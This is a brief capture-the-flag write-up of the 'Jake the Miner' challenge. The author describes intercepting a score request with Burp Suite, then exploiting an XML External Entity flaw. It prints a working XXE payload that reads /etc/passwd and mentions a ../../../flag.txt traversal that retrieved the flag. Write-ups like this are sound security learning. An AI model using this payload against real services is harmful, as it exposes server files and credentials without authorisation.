# Jake the Miner

In this challenge , I  click many time the miner it do faster , then interecpt with burp suite when click submit score. Then change score to 100 but it nothing change. Then try many times 

<img width="663" height="339" alt="image" src="https://github.com/user-attachments/assets/2285ecaa-fa2f-42bc-8f00-8c849f94a483" />


Then I realise the request was vulnerable to XML External Entity (XXE) attacks.Then put basic payload of xxe :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<img width="692" height="284" alt="image" src="https://github.com/user-attachments/assets/45d16ab3-4828-407f-9c7f-fbfe83c1dda0" />


After few times payload, I put ../../../flag.txt  , it successfully display the flag of this challenge in response.
<img width="692" height="245" alt="image" src="https://github.com/user-attachments/assets/8c43eeee-2c67-441a-918f-99099aae9531" />
